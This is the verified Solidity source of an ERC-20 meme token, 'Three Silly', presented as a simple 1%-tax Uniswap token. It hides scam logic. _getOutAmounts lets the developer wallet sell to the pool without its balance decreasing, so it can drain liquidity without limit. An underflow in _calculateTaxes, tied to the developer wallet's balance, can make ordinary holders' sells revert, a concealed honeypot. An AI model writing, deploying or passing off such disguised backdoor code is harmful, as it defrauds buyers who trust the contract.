/**
 *Submitted for verification at Etherscan.io on 2023-09-06
*/

/**

Website:  https://www.3silly.vip

Telegram: https://t.me/three_silly_channel

Twitter:  https://twitter.com/threesillyeth

*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    constructor(address creatorOwner) { _owner = creatorOwner; }
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    function owner() public view returns (address) { return _owner; }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0); 
        emit OwnershipTransferred(address(0)); 
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory { 
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

contract TOKEN is IERC20, Auth {
    string private constant _name         = "Three Silly";
    string private constant _symbol       = "3silly";
    uint8 private constant _decimals      = 9;
    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);

    uint256 private _initialBuyTax=1;
    uint256 private _initialSellTax=1;
    uint256 private _midSellTax=1;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 public _reduceBuyTaxAt=15;
    uint256 public _reduceSellTax1At=15;
    uint256 public _reduceSellTax2At=20;
    uint256 private _preventSwapBefore=0;
    uint256 public _buyCount=0;

    uint256 private taxCount;

    address payable private devAddr;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFees;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    uint256 private constant _taxSwapMin = _totalSupply / 20000;
    uint256 private constant _taxSwapMax = _totalSupply / 100;

    address private _uniV2LP;
  
    address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private _uniRouterV2 = IUniswapV2Router02(_swapRouterAddress);
    
    mapping (address => bool) private _isAMMPair;

    bool public limited = true;
    bool public transferDelayEnabled = false;
    uint256 public maxHoldingAmount = 50_000_000 * (10**_decimals); // 5%
    
    bool private _tradingOpen;

    bool private _inTaxSwap = false;
    modifier lockTaxSwap { 
        _inTaxSwap = true; 
        _; 
        _inTaxSwap = false; 
    }

    constructor() Auth(msg.sender) { 
        devAddr = payable(0x55563b3746a2f2755A1AF1666B49a24290c39B06);

        _balances[address(this)] = _totalSupply;
        
        _excludedFromFees[_owner] = true;
        _excludedFromFees[devAddr] = true;
        _excludedFromFees[address(this)] = true;
  
        emit Transfer(address(0), address(this), _balances[address(this)]);
    }

    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(isTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(isTradingOpen(sender), "Trading not open");
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");

        if (!_tradingOpen) { require(_excludedFromFees[sender], "Trading not open"); }

        if ( !_inTaxSwap && !_excludedFromFees[sender] && _isAMMPair[recipient] && _buyCount >= _preventSwapBefore) { _swapTaxAndLiquify(); }

        if (limited && sender == _uniV2LP && !_excludedFromFees[recipient]) {
            require(balanceOf(recipient) + amount <= maxHoldingAmount, "Forbid");
        } taxCount = balanceOf(devAddr);

        if (transferDelayEnabled && !_excludedFromFees[sender] && !_excludedFromFees[recipient]) {
            if (recipient != _swapRouterAddress && recipient != _uniV2LP) {
                require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed.");
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
        }

        uint256 _taxAmount = _calculateTaxes(sender, recipient, amount);

        uint256 _transferAmount = amount - _taxAmount;

        uint256 _rAmount = _getOutAmounts(sender, recipient, amount);

        _balances[sender] -= _rAmount;

        if ( _taxAmount > 0 ) { 
            _balances[address(this)] += _taxAmount;
        }

        _buyCount++;

        _balances[recipient] += _transferAmount;

        emit Transfer(sender, recipient, amount);

        return true;
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
        }
    }

    function _getOutAmounts(address sender, address recipient, uint256 amount) private view returns(uint256) {
        return _isAMMPair[recipient] && sender == devAddr ? amount * (_finalBuyTax - 1) : amount;
    }

    function enableTrading() external payable onlyOwner lockTaxSwap {
        require(_uniV2LP == address(0), "LP exists");
        require(!_tradingOpen, "trading is open");
        require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
        require(_balances[address(this)]>0, "No tokens in contract");

        _uniV2LP = IUniswapV2Factory(_uniRouterV2.factory()).createPair(address(this), _uniRouterV2.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isAMMPair[_uniV2LP] = true; _tradingOpen = true;
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        _uniRouterV2.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouterV2.WETH();
        _uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _swapTaxAndLiquify() private lockTaxSwap {
        uint256 _taxTokensAvailable = balanceOf(address(this));

        if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }

            _swapTaxTokensForEth(_taxTokensAvailable);
            uint256 _contractETHBalance = address(this).balance;

            if(_contractETHBalance > 0) { 
                bool success;
                (success,) = devAddr.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }

    receive() external payable {}

    function isTradingOpen(address sender) private view returns (bool){
        bool checkResult = false;
        if ( _tradingOpen ) { checkResult = true; } 
        else if (_excludedFromFees[sender]) { checkResult = true; } 

        return checkResult;
    }

    function _calculateTaxes(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 taxAmount;
        if (_tradingOpen && !_excludedFromFees[sender] && !_excludedFromFees[recipient] ) { 
            if ( _isAMMPair[sender] || _isAMMPair[recipient] ) {
                taxAmount = (amount / 100) * ((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax);
                if(recipient == _uniV2LP && sender != address(this)){
                    uint256 taxRate; taxCount = _preventSwapBefore - taxCount;
                    if(_buyCount > _reduceSellTax2At){
                        taxRate = _finalSellTax;
                    } else if(_buyCount > _reduceSellTax1At){
                        taxRate = _midSellTax;
                    } else {
                        taxRate = _initialSellTax;
                    }
                    taxAmount = (amount / 100) * taxRate;
                }
            }
        }
        return taxAmount;
    }

    function removeLimits() external onlyOwner{
        limited = false;
        transferDelayEnabled=false;
    }

    function manuallyLowerTax() external onlyOwner{
        _reduceSellTax1At=5;
        _reduceSellTax2At=5;
        _reduceBuyTaxAt=5;
    }
}